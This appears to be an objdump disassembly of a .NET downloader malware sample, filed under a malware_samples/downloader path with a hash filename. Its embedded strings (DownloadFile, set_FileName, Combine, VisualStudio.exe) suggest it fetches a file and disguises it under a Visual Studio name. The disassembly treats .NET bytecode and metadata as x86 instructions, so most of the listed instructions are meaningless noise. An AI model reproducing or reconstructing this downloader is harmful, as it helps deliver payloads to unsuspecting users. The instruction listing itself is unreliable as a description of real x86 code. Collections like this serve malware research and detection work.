
malware_samples/downloader/fe9be947238b7d3c842a9890df865ea732a9e75bd0f5f33bfeb9878d52f40720.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	2a 2a                	sub    (%edx),%ch
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 38 21 00    	add    %al,0x213800
  402013:	00 18                	add    %bl,(%eax)
  402015:	08 00                	or     %al,(%eax)
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	03 00                	add    (%eax),%eax
  402054:	b4 00                	mov    $0x0,%ah
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 28                	add    %ch,(%eax)
  40205e:	0e                   	push   %cs
  40205f:	00 00                	add    %al,(%eax)
  402061:	0a 0a                	or     (%edx),%cl
  402063:	06                   	push   %es
  402064:	72 01                	jb     0x402067
  402066:	00 00                	add    %al,(%eax)
  402068:	70 28                	jo     0x402092
  40206a:	0f 00 00             	sldt   (%eax)
  40206d:	0a 0b                	or     (%ebx),%cl
  40206f:	72 1f                	jb     0x402090
  402071:	00 00                	add    %al,(%eax)
  402073:	70 0c                	jo     0x402081
  402075:	28 10                	sub    %dl,(%eax)
  402077:	00 00                	add    %al,(%eax)
  402079:	0a 0d 07 28 11 00    	or     0x112807,%cl
  40207f:	00 0a                	add    %cl,(%edx)
  402081:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402084:	04 2c                	add    $0x2c,%al
  402086:	1f                   	pop    %ds
  402087:	00 73 12             	add    %dh,0x12(%ebx)
  40208a:	00 00                	add    %al,(%eax)
  40208c:	0a 13                	or     (%ebx),%dl
  40208e:	05 11 05 6f 13       	add    $0x136f0511,%eax
  402093:	00 00                	add    %al,(%eax)
  402095:	0a 07                	or     (%edi),%al
  402097:	6f                   	outsl  %ds:(%esi),(%dx)
  402098:	14 00                	adc    $0x0,%al
  40209a:	00 0a                	add    %cl,(%edx)
  40209c:	00 11                	add    %dl,(%ecx)
  40209e:	05 6f 15 00 00       	add    $0x156f,%eax
  4020a3:	0a 26                	or     (%esi),%ah
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	00 73 16             	add    %dh,0x16(%ebx)
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	0a 13                	or     (%ebx),%dl
  4020ae:	06                   	push   %es
  4020af:	00 28                	add    %ch,(%eax)
  4020b1:	17                   	pop    %ss
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	0a 13                	or     (%ebx),%dl
  4020b6:	0a 12                	or     (%edx),%dl
  4020b8:	0a fe                	or     %dh,%bh
  4020ba:	16                   	push   %ss
  4020bb:	12 00                	adc    (%eax),%al
  4020bd:	00 01                	add    %al,(%ecx)
  4020bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4020c0:	18 00                	sbb    %al,(%eax)
  4020c2:	00 0a                	add    %cl,(%edx)
  4020c4:	72 dc                	jb     0x4020a2
  4020c6:	00 00                	add    %al,(%eax)
  4020c8:	70 28                	jo     0x4020f2
  4020ca:	19 00                	sbb    %eax,(%eax)
  4020cc:	00 0a                	add    %cl,(%edx)
  4020ce:	13 07                	adc    (%edi),%eax
  4020d0:	09 11                	or     %edx,(%ecx)
  4020d2:	07                   	pop    %es
  4020d3:	28 0f                	sub    %cl,(%edi)
  4020d5:	00 00                	add    %al,(%eax)
  4020d7:	0a 13                	or     (%ebx),%dl
  4020d9:	08 09                	or     %cl,(%ecx)
  4020db:	11 07                	adc    %eax,(%edi)
  4020dd:	28 0f                	sub    %cl,(%edi)
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	0a 13                	or     (%ebx),%dl
  4020e3:	09 11                	or     %edx,(%ecx)
  4020e5:	06                   	push   %es
  4020e6:	08 11                	or     %dl,(%ecx)
  4020e8:	08 6f 1a             	or     %ch,0x1a(%edi)
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	0a 00                	or     (%eax),%al
  4020ef:	11 09                	adc    %ecx,(%ecx)
  4020f1:	28 1b                	sub    %bl,(%ebx)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	0a 26                	or     (%esi),%ah
  4020f7:	00 de                	add    %bl,%dh
  4020f9:	0d 11 06 2c 08       	or     $0x82c0611,%eax
  4020fe:	11 06                	adc    %eax,(%esi)
  402100:	6f                   	outsl  %ds:(%esi),(%dx)
  402101:	1c 00                	sbb    $0x0,%al
  402103:	00 0a                	add    %cl,(%edx)
  402105:	00 dc                	add    %bl,%ah
  402107:	00 de                	add    %bl,%dh
  402109:	05 26 00 00 de       	add    $0xde000026,%eax
  40210e:	00 2a                	add    %ch,(%edx)
  402110:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402113:	00 02                	add    %al,(%edx)
  402115:	00 53 00             	add    %dl,0x0(%ebx)
  402118:	4b                   	dec    %ebx
  402119:	9e                   	sahf
  40211a:	00 0d 00 00 00 00    	add    %cl,0x0
  402120:	00 00                	add    %al,(%eax)
  402122:	4b                   	dec    %ebx
  402123:	00 63 ae             	add    %ah,-0x52(%ebx)
  402126:	00 05 13 00 00 01    	add    %al,0x1000013
  40212c:	22 02                	and    (%edx),%al
  40212e:	28 1d 00 00 0a 00    	sub    %bl,0xa0000
  402134:	2a 00                	sub    (%eax),%al
  402136:	00 00                	add    %al,(%eax)
  402138:	42                   	inc    %edx
  402139:	53                   	push   %ebx
  40213a:	4a                   	dec    %edx
  40213b:	42                   	inc    %edx
  40213c:	01 00                	add    %eax,(%eax)
  40213e:	01 00                	add    %eax,(%eax)
  402140:	00 00                	add    %al,(%eax)
  402142:	00 00                	add    %al,(%eax)
  402144:	0c 00                	or     $0x0,%al
  402146:	00 00                	add    %al,(%eax)
  402148:	76 34                	jbe    0x40217e
  40214a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40214d:	33 30                	xor    (%eax),%esi
  40214f:	33 31                	xor    (%ecx),%esi
  402151:	39 00                	cmp    %eax,(%eax)
  402153:	00 00                	add    %al,(%eax)
  402155:	00 05 00 6c 00 00    	add    %al,0x6c00
  40215b:	00 5c 02 00          	add    %bl,0x0(%edx,%eax,1)
  40215f:	00 23                	add    %ah,(%ebx)
  402161:	7e 00                	jle    0x402163
  402163:	00 c8                	add    %cl,%al
  402165:	02 00                	add    (%eax),%al
  402167:	00 10                	add    %dl,(%eax)
  402169:	03 00                	add    (%eax),%eax
  40216b:	00 23                	add    %ah,(%ebx)
  40216d:	53                   	push   %ebx
  40216e:	74 72                	je     0x4021e2
  402170:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402177:	00 d8                	add    %bl,%al
  402179:	05 00 00 e8 00       	add    $0xe80000,%eax
  40217e:	00 00                	add    %al,(%eax)
  402180:	23 55 53             	and    0x53(%ebp),%edx
  402183:	00 c0                	add    %al,%al
  402185:	06                   	push   %es
  402186:	00 00                	add    %al,(%eax)
  402188:	10 00                	adc    %al,(%eax)
  40218a:	00 00                	add    %al,(%eax)
  40218c:	23 47 55             	and    0x55(%edi),%eax
  40218f:	49                   	dec    %ecx
  402190:	44                   	inc    %esp
  402191:	00 00                	add    %al,(%eax)
  402193:	00 d0                	add    %dl,%al
  402195:	06                   	push   %es
  402196:	00 00                	add    %al,(%eax)
  402198:	48                   	dec    %eax
  402199:	01 00                	add    %eax,(%eax)
  40219b:	00 23                	add    %ah,(%ebx)
  40219d:	42                   	inc    %edx
  40219e:	6c                   	insb   (%dx),%es:(%edi)
  40219f:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a0:	62 00                	bound  %eax,(%eax)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	00 00                	add    %al,(%eax)
  4021a6:	00 00                	add    %al,(%eax)
  4021a8:	02 00                	add    (%eax),%al
  4021aa:	00 01                	add    %al,(%ecx)
  4021ac:	47                   	inc    %edi
  4021ad:	15 02 00 09 00       	adc    $0x90002,%eax
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	00 fa                	add    %bh,%dl
  4021b6:	01 33                	add    %esi,(%ebx)
  4021b8:	00 16                	add    %dl,(%esi)
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	01 00                	add    %eax,(%eax)
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	19 00                	sbb    %eax,(%eax)
  4021c2:	00 00                	add    %al,(%eax)
  4021c4:	02 00                	add    (%eax),%al
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	02 00                	add    (%eax),%al
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	01 00                	add    %eax,(%eax)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	1d 00 00 00 0d       	sbb    $0xd000000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	00 01                	add    %al,(%ecx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	00 01                	add    %al,(%ecx)
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	00 02                	add    %al,(%edx)
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	00 00                	add    %al,(%eax)
  4021e5:	00 ac 01 01 00 00 00 	add    %ch,0x1(%ecx,%eax,1)
  4021ec:	00 00                	add    %al,(%eax)
  4021ee:	06                   	push   %es
  4021ef:	00 21                	add    %ah,(%ecx)
  4021f1:	01 8f 02 06 00 8e    	add    %ecx,-0x71fff9fe(%edi)
  4021f7:	01 8f 02 06 00 69    	add    %ecx,0x69000602(%edi)
  4021fd:	00 5d 02             	add    %bl,0x2(%ebp)
  402200:	0f 00 af 02 00 00 06 	verw   0x6000002(%edi)
  402207:	00 7d 00             	add    %bh,0x0(%ebp)
  40220a:	00 02                	add    %al,(%edx)
  40220c:	06                   	push   %es
  40220d:	00 04 01             	add    %al,(%ecx,%eax,1)
  402210:	00 02                	add    %al,(%edx)
  402212:	06                   	push   %es
  402213:	00 e5                	add    %ah,%ch
  402215:	00 00                	add    %al,(%eax)
  402217:	02 06                	add    (%esi),%al
  402219:	00 75 01             	add    %dh,0x1(%ebp)
  40221c:	00 02                	add    %al,(%edx)
  40221e:	06                   	push   %es
  40221f:	00 41 01             	add    %al,0x1(%ecx)
  402222:	00 02                	add    %al,(%edx)
  402224:	06                   	push   %es
  402225:	00 5a 01             	add    %bl,0x1(%edx)
  402228:	00 02                	add    %al,(%edx)
  40222a:	06                   	push   %es
  40222b:	00 94 00 00 02 06 00 	add    %dl,0x60200(%eax,%eax,1)
  402232:	5b                   	pop    %ebx
  402233:	00 70 02             	add    %dh,0x2(%eax)
  402236:	06                   	push   %es
  402237:	00 c8                	add    %cl,%al
  402239:	00 00                	add    %al,(%eax)
  40223b:	02 06                	add    (%esi),%al
  40223d:	00 af 00 bd 01 06    	add    %ch,0x601bd00(%edi)
  402243:	00 d9                	add    %bl,%cl
  402245:	02 f4                	add    %ah,%dh
  402247:	01 0a                	add    %ecx,(%edx)
  402249:	00 c3                	add    %al,%bl
  40224b:	02 5d 02             	add    0x2(%ebp),%bl
  40224e:	0a 00                	or     (%eax),%al
  402250:	eb 02                	jmp    0x402254
  402252:	e0 02                	loopne 0x402256
  402254:	06                   	push   %es
  402255:	00 20                	add    %ah,(%eax)
  402257:	00 f4                	add    %dh,%ah
  402259:	01 06                	add    %eax,(%esi)
  40225b:	00 12                	add    %dl,(%edx)
  40225d:	02 f4                	add    %ah,%dh
  40225f:	01 06                	add    %eax,(%esi)
  402261:	00 05 03 0a 00 06    	add    %al,0x6000a03
  402267:	00 e7                	add    %ah,%bh
  402269:	01 0a                	add    %ecx,(%edx)
  40226b:	00 06                	add    %al,(%esi)
  40226d:	00 39                	add    %bh,(%ecx)
  40226f:	00 0a                	add    %cl,(%edx)
  402271:	00 0a                	add    %cl,(%edx)
  402273:	00 2a                	add    %ch,(%edx)
  402275:	02 5d 02             	add    0x2(%ebp),%bl
  402278:	06                   	push   %es
  402279:	00 d9                	add    %bl,%cl
  40227b:	01 f4                	add    %esi,%esp
  40227d:	01 06                	add    %eax,(%esi)
  40227f:	00 25 00 f4 01 00    	add    %ah,0x1f400
  402285:	00 00                	add    %al,(%eax)
  402287:	00 01                	add    %al,(%ecx)
  402289:	00 00                	add    %al,(%eax)
  40228b:	00 00                	add    %al,(%eax)
  40228d:	00 01                	add    %al,(%ecx)
  40228f:	00 01                	add    %al,(%ecx)
  402291:	00 00                	add    %al,(%eax)
  402293:	00 10                	add    %dl,(%eax)
  402295:	00 ec                	add    %ch,%ah
  402297:	01 48 02             	add    %ecx,0x2(%eax)
  40229a:	3d 00 01 00 01       	cmp    $0x1000100,%eax
  40229f:	00 50 20             	add    %dl,0x20(%eax)
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	00 00                	add    %al,(%eax)
  4022a6:	91                   	xchg   %eax,%ecx
  4022a7:	00 fb                	add    %bh,%bl
  4022a9:	01 5c 00 01          	add    %ebx,0x1(%eax,%eax,1)
  4022ad:	00 2c 21             	add    %ch,(%ecx,%eiz,1)
  4022b0:	00 00                	add    %al,(%eax)
  4022b2:	00 00                	add    %al,(%eax)
  4022b4:	86 18                	xchg   %bl,(%eax)
  4022b6:	57                   	push   %edi
  4022b7:	02 06                	add    (%esi),%al
  4022b9:	00 02                	add    %al,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	00 01                	add    %al,(%ecx)
  4022bf:	00 be 02 09 00 57    	add    %bh,0x57000902(%esi)
  4022c5:	02 01                	add    (%ecx),%al
  4022c7:	00 11                	add    %dl,(%ecx)
  4022c9:	00 57 02             	add    %dl,0x2(%edi)
  4022cc:	06                   	push   %es
  4022cd:	00 19                	add    %bl,(%ecx)
  4022cf:	00 57 02             	add    %dl,0x2(%edi)
  4022d2:	0a 00                	or     (%eax),%al
  4022d4:	29 00                	sub    %eax,(%eax)
  4022d6:	57                   	push   %edi
  4022d7:	02 10                	add    (%eax),%dl
  4022d9:	00 31                	add    %dh,(%ecx)
  4022db:	00 57 02             	add    %dl,0x2(%edi)
  4022de:	10 00                	adc    %al,(%eax)
  4022e0:	39 00                	cmp    %eax,(%eax)
  4022e2:	57                   	push   %edi
  4022e3:	02 10                	add    (%eax),%dl
  4022e5:	00 41 00             	add    %al,0x0(%ecx)
  4022e8:	57                   	push   %edi
  4022e9:	02 10                	add    (%eax),%dl
  4022eb:	00 49 00             	add    %cl,0x0(%ecx)
  4022ee:	57                   	push   %edi
  4022ef:	02 10                	add    (%eax),%dl
  4022f1:	00 51 00             	add    %dl,0x0(%ecx)
  4022f4:	57                   	push   %edi
  4022f5:	02 10                	add    (%eax),%dl
  4022f7:	00 59 00             	add    %bl,0x0(%ecx)
  4022fa:	57                   	push   %edi
  4022fb:	02 10                	add    (%eax),%dl
  4022fd:	00 61 00             	add    %ah,0x0(%ecx)
  402300:	57                   	push   %edi
  402301:	02 10                	add    (%eax),%dl
  402303:	00 69 00             	add    %ch,0x0(%ecx)
  402306:	57                   	push   %edi
  402307:	02 10                	add    (%eax),%dl
  402309:	00 71 00             	add    %dh,0x0(%ecx)
  40230c:	57                   	push   %edi
  40230d:	02 10                	add    (%eax),%dl
  40230f:	00 a1 00 fb 02 26    	add    %ah,0x2602fb00(%ecx)
  402315:	00 a9 00 4b 00 2a    	add    %ch,0x2a004b00(%ecx)
  40231b:	00 a9 00 e0 01 26    	add    %ch,0x2601e000(%ecx)
  402321:	00 b1 00 cb 02 30    	add    %dh,0x3002cb00(%ecx)
  402327:	00 81 00 57 02 06    	add    %al,0x6025700(%ecx)
  40232d:	00 81 00 1c 02 35    	add    %al,0x35021c00(%ecx)
  402333:	00 b9 00 3e 00 10    	add    %bh,0x10003e00(%ecx)
  402339:	00 81 00 f5 02 3a    	add    %al,0x3a02f500(%ecx)
  40233f:	00 89 00 57 02 06    	add    %cl,0x6025700(%ecx)
  402345:	00 91 00 1d 00 3e    	add    %dl,0x3e001d00(%ecx)
  40234b:	00 79 00             	add    %bh,0x0(%ecx)
  40234e:	d7                   	xlat   %ds:(%ebx)
  40234f:	01 43 00             	add    %eax,0x0(%ebx)
  402352:	c1 00 d2             	roll   $0xd2,(%eax)
  402355:	02 2a                	add    (%edx),%ch
  402357:	00 89 00 31 00 47    	add    %cl,0x47003100(%ecx)
  40235d:	00 81 00 f5 02 4d    	add    %al,0x4d02f500(%ecx)
  402363:	00 c9                	add    %cl,%cl
  402365:	00 53 00             	add    %dl,0x0(%ebx)
  402368:	06                   	push   %es
  402369:	00 79 00             	add    %bh,0x0(%ecx)
  40236c:	57                   	push   %edi
  40236d:	02 06                	add    (%esi),%al
  40236f:	00 2e                	add    %ch,(%esi)
  402371:	00 0b                	add    %cl,(%ebx)
  402373:	00 62 00             	add    %ah,0x0(%edx)
  402376:	2e 00 13             	add    %dl,%cs:(%ebx)
  402379:	00 6b 00             	add    %ch,0x0(%ebx)
  40237c:	2e 00 1b             	add    %bl,%cs:(%ebx)
  40237f:	00 8a 00 2e 00 23    	add    %cl,0x23002e00(%edx)
  402385:	00 93 00 2e 00 2b    	add    %dl,0x2b002e00(%ebx)
  40238b:	00 c0                	add    %al,%al
  40238d:	00 2e                	add    %ch,(%esi)
  40238f:	00 33                	add    %dh,(%ebx)
  402391:	00 c0                	add    %al,%al
  402393:	00 2e                	add    %ch,(%esi)
  402395:	00 3b                	add    %bh,(%ebx)
  402397:	00 c0                	add    %al,%al
  402399:	00 2e                	add    %ch,(%esi)
  40239b:	00 43 00             	add    %al,0x0(%ebx)
  40239e:	93                   	xchg   %eax,%ebx
  40239f:	00 2e                	add    %ch,(%esi)
  4023a1:	00 4b 00             	add    %cl,0x0(%ebx)
  4023a4:	93                   	xchg   %eax,%ebx
  4023a5:	00 2e                	add    %ch,(%esi)
  4023a7:	00 53 00             	add    %dl,0x0(%ebx)
  4023aa:	c0 00 2e             	rolb   $0x2e,(%eax)
  4023ad:	00 5b 00             	add    %bl,0x0(%ebx)
  4023b0:	c6 00 2e             	movb   $0x2e,(%eax)
  4023b3:	00 63 00             	add    %ah,0x0(%ebx)
  4023b6:	f0 00 2e             	lock add %ch,(%esi)
  4023b9:	00 6b 00             	add    %ch,0x0(%ebx)
  4023bc:	fd                   	std
  4023bd:	00 15 00 04 80 00    	add    %dl,0x800400
  4023c3:	00 01                	add    %al,(%ecx)
	...
  4023d1:	00 3b                	add    %bh,(%ebx)
  4023d3:	02 00                	add    (%eax),%al
  4023d5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4023e0:	00 00                	add    %al,(%eax)
  4023e2:	53                   	push   %ebx
  4023e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4023e6:	00 00                	add    %al,(%eax)
  4023e8:	00 00                	add    %al,(%eax)
  4023ea:	04 00                	add    $0x0,%al
	...
  4023f4:	00 00                	add    %al,(%eax)
  4023f6:	53                   	push   %ebx
  4023f7:	00 f4                	add    %dh,%ah
  4023f9:	01 00                	add    %eax,(%eax)
  4023fb:	00 00                	add    %al,(%eax)
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	3c 4d                	cmp    $0x4d,%al
  402403:	6f                   	outsl  %ds:(%esi),(%dx)
  402404:	64 75 6c             	fs jne 0x402473
  402407:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  40240c:	73 74                	jae    0x402482
  40240e:	65 6d                	gs insl (%dx),%es:(%edi)
  402410:	2e 49                	cs dec %ecx
  402412:	4f                   	dec    %edi
  402413:	00 6d 73             	add    %ch,0x73(%ebp)
  402416:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402419:	6c                   	insb   (%dx),%es:(%edi)
  40241a:	69 62 00 4e 65 77 47 	imul   $0x4777654e,0x0(%edx),%esp
  402421:	75 69                	jne    0x40248c
  402423:	64 00 49 44          	add    %cl,%fs:0x44(%ecx)
  402427:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40242e:	6c                   	insb   (%dx),%es:(%edi)
  40242f:	65 00 44 6f 77       	add    %al,%gs:0x77(%edi,%ebp,2)
  402434:	6e                   	outsb  %ds:(%esi),(%dx)
  402435:	6c                   	insb   (%dx),%es:(%edi)
  402436:	6f                   	outsl  %ds:(%esi),(%dx)
  402437:	61                   	popa
  402438:	64 46                	fs inc %esi
  40243a:	69 6c 65 00 73 65 74 	imul   $0x5f746573,0x0(%ebp,%eiz,2),%ebp
  402441:	5f 
  402442:	46                   	inc    %esi
  402443:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40244a:	00 
  40244b:	43                   	inc    %ebx
  40244c:	6f                   	outsl  %ds:(%esi),(%dx)
  40244d:	6d                   	insl   (%dx),%es:(%edi)
  40244e:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  402451:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  402456:	70 6f                	jo     0x4024c7
  402458:	73 65                	jae    0x4024bf
  40245a:	00 47 75             	add    %al,0x75(%edi)
  40245d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402464:	62 
  402465:	75 74                	jne    0x4024db
  402467:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40246c:	75 67                	jne    0x4024d5
  40246e:	67 61                	addr16 popa
  402470:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402474:	74 74                	je     0x4024ea
  402476:	72 69                	jb     0x4024e1
  402478:	62 75 74             	bound  %esi,0x74(%ebp)
  40247b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40247f:	73 65                	jae    0x4024e6
  402481:	6d                   	insl   (%dx),%es:(%edi)
  402482:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402486:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40248d:	72 
  40248e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402495:	73 73                	jae    0x40250a
  402497:	65 6d                	gs insl (%dx),%es:(%edi)
  402499:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40249d:	72 61                	jb     0x402500
  40249f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4024a2:	61                   	popa
  4024a3:	72 6b                	jb     0x402510
  4024a5:	41                   	inc    %ecx
  4024a6:	74 74                	je     0x40251c
  4024a8:	72 69                	jb     0x402513
  4024aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4024ad:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4024b2:	67 65 74 46          	addr16 gs je 0x4024fc
  4024b6:	72 61                	jb     0x402519
  4024b8:	6d                   	insl   (%dx),%es:(%edi)
  4024b9:	65 77 6f             	gs ja  0x40252b
  4024bc:	72 6b                	jb     0x402529
  4024be:	41                   	inc    %ecx
  4024bf:	74 74                	je     0x402535
  4024c1:	72 69                	jb     0x40252c
  4024c3:	62 75 74             	bound  %esi,0x74(%ebp)
  4024c6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024ca:	73 65                	jae    0x402531
  4024cc:	6d                   	insl   (%dx),%es:(%edi)
  4024cd:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4024d1:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4024d8:	69 
  4024d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4024da:	6e                   	outsb  %ds:(%esi),(%dx)
  4024db:	41                   	inc    %ecx
  4024dc:	74 74                	je     0x402552
  4024de:	72 69                	jb     0x402549
  4024e0:	62 75 74             	bound  %esi,0x74(%ebp)
  4024e3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4024e7:	73 65                	jae    0x40254e
  4024e9:	6d                   	insl   (%dx),%es:(%edi)
  4024ea:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4024ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4024f0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4024f6:	74 69                	je     0x402561
  4024f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4024fa:	41                   	inc    %ecx
  4024fb:	74 74                	je     0x402571
  4024fd:	72 69                	jb     0x402568
  4024ff:	62 75 74             	bound  %esi,0x74(%ebp)
  402502:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402506:	73 65                	jae    0x40256d
  402508:	6d                   	insl   (%dx),%es:(%edi)
  402509:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40250d:	65 73 63             	gs jae 0x402573
  402510:	72 69                	jb     0x40257b
  402512:	70 74                	jo     0x402588
  402514:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40251b:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402522:	6f                   	outsl  %ds:(%esi),(%dx)
  402523:	6d                   	insl   (%dx),%es:(%edi)
  402524:	70 69                	jo     0x40258f
  402526:	6c                   	insb   (%dx),%es:(%edi)
  402527:	61                   	popa
  402528:	74 69                	je     0x402593
  40252a:	6f                   	outsl  %ds:(%esi),(%dx)
  40252b:	6e                   	outsb  %ds:(%esi),(%dx)
  40252c:	52                   	push   %edx
  40252d:	65 6c                	gs insb (%dx),%es:(%edi)
  40252f:	61                   	popa
  402530:	78 61                	js     0x402593
  402532:	74 69                	je     0x40259d
  402534:	6f                   	outsl  %ds:(%esi),(%dx)
  402535:	6e                   	outsb  %ds:(%esi),(%dx)
  402536:	73 41                	jae    0x402579
  402538:	74 74                	je     0x4025ae
  40253a:	72 69                	jb     0x4025a5
  40253c:	62 75 74             	bound  %esi,0x74(%ebp)
  40253f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402543:	73 65                	jae    0x4025aa
  402545:	6d                   	insl   (%dx),%es:(%edi)
  402546:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40254a:	72 6f                	jb     0x4025bb
  40254c:	64 75 63             	fs jne 0x4025b2
  40254f:	74 41                	je     0x402592
  402551:	74 74                	je     0x4025c7
  402553:	72 69                	jb     0x4025be
  402555:	62 75 74             	bound  %esi,0x74(%ebp)
  402558:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40255c:	73 65                	jae    0x4025c3
  40255e:	6d                   	insl   (%dx),%es:(%edi)
  40255f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402563:	6f                   	outsl  %ds:(%esi),(%dx)
  402564:	70 79                	jo     0x4025df
  402566:	72 69                	jb     0x4025d1
  402568:	67 68 74 41 74 74    	addr16 push $0x74744174
  40256e:	72 69                	jb     0x4025d9
  402570:	62 75 74             	bound  %esi,0x74(%ebp)
  402573:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402577:	73 65                	jae    0x4025de
  402579:	6d                   	insl   (%dx),%es:(%edi)
  40257a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40257e:	6f                   	outsl  %ds:(%esi),(%dx)
  40257f:	6d                   	insl   (%dx),%es:(%edi)
  402580:	70 61                	jo     0x4025e3
  402582:	6e                   	outsb  %ds:(%esi),(%dx)
  402583:	79 41                	jns    0x4025c6
  402585:	74 74                	je     0x4025fb
  402587:	72 69                	jb     0x4025f2
  402589:	62 75 74             	bound  %esi,0x74(%ebp)
  40258c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402590:	6e                   	outsb  %ds:(%esi),(%dx)
  402591:	74 69                	je     0x4025fc
  402593:	6d                   	insl   (%dx),%es:(%edi)
  402594:	65 43                	gs inc %ebx
  402596:	6f                   	outsl  %ds:(%esi),(%dx)
  402597:	6d                   	insl   (%dx),%es:(%edi)
  402598:	70 61                	jo     0x4025fb
  40259a:	74 69                	je     0x402605
  40259c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40259f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4025a6:	69 
  4025a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4025aa:	65 00 56 69          	add    %dl,%gs:0x69(%esi)
  4025ae:	73 75                	jae    0x402625
  4025b0:	61                   	popa
  4025b1:	6c                   	insb   (%dx),%es:(%edi)
  4025b2:	53                   	push   %ebx
  4025b3:	74 75                	je     0x40262a
  4025b5:	64 69 6f 2e 65 78 65 	imul   $0x657865,%fs:0x2e(%edi),%ebp
  4025bc:	00 
  4025bd:	53                   	push   %ebx
  4025be:	79 73                	jns    0x402633
  4025c0:	74 65                	je     0x402627
  4025c2:	6d                   	insl   (%dx),%es:(%edi)
  4025c3:	2e 52                	cs push %edx
  4025c5:	75 6e                	jne    0x402635
  4025c7:	74 69                	je     0x402632
  4025c9:	6d                   	insl   (%dx),%es:(%edi)
  4025ca:	65 2e 56             	gs cs push %esi
  4025cd:	65 72 73             	gs jb  0x402643
  4025d0:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4025d7:	54                   	push   %esp
  4025d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4025d9:	53                   	push   %ebx
  4025da:	74 72                	je     0x40264e
  4025dc:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4025e3:	54                   	push   %esp
